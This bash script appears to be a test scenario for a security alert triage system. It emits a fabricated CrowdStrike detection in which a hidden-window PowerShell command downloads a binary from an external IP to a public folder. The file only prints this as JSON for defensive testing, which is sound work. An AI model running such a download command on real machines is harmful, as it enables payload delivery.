#!/usr/bin/env bash
# =============================================================================
# Scenario: Suspicious - PowerShell remote download
# =============================================================================
# MITRE ATT&CK: T1105
# Tactic:     Command and Control
# Severity:   MEDIUM (vendor-reported; Vyrox re-triages independently)
#
# Hidden-window PowerShell pulling a binary from an external IP. Suspicious but not confirmed malicious.
#
# Expected Vyrox verdict: MEDIUM (ambiguous -> LLM tier).
# =============================================================================

SCENARIO_NAME="medium_ps_download"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="MEDIUM"
SCENARIO_TACTIC="Command and Control"
SCENARIO_TECHNIQUE="T1105"

# Unique per fire (timestamp + random): the pipeline dedupes on
# (tenant, source, raw_id), so a per-second id would collapse rapid back-to-back
# fires of the same scenario into one alert. The random suffix keeps each fire a
# distinct detection, the way a real EDR assigns a fresh detect_id each time.
TIMESTAMP=$(date +%s)
DETECT_ID="cs-${TIMESTAMP}-${RANDOM}${RANDOM}"

# build_payload - emit the CrowdStrike-format detection JSON for this scenario.
# Args: $1 tenant_id (default "default-tenant").
build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "win-workstation-25"
    },
    "process": {
        "user_name": "CORP\\\\nwright",
        "file_name": "powershell.exe",
        "command_line": "powershell -nop -w hidden Invoke-WebRequest -Uri http://198.51.100.20/a.bin -OutFile C:/Users/Public/a.bin",
        "sha256": "9999999999999999999999999999999999999999999999999999999999999999"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
